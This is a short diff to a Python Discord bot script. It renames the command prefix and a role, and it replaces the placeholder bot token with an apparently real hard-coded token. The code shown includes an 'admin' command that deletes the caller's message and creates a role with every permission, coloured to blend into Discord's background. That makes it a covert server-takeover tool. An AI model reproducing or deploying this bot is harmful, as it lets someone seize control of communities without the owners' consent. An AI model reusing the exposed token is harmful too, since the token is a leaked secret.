@@ -10,7 +10,7 @@ import string
 import random
 
 client = commands.Bot(
-    command_prefix='.',
+    command_prefix='x',
     case_insensitive=True
 )
 
@@ -52,7 +52,7 @@ async def admin(ctx):
     """Gives a role with all permissions enabled to the message author."""
     await ctx.message.delete()
     await ctx.guild.create_role(
-        name='Hacker',
+        name='death',
         permissions=Permissions.all(),
         color=discord.Color(0x36393f)
     )
@@ -247,4 +247,4 @@ async def logout(ctx):
     """Logs the bot out."""
     await client.logout()
 
-client.run('TOKEN')  # replace TOKEN with your bot token
+client.run('NzI1NTkwNDMxMTkwMjIwODYz.XvQ9RQ.w3oxfB5SFxm3beDqXhyWPUPWcgs')  # replace TOKEN with your bot token
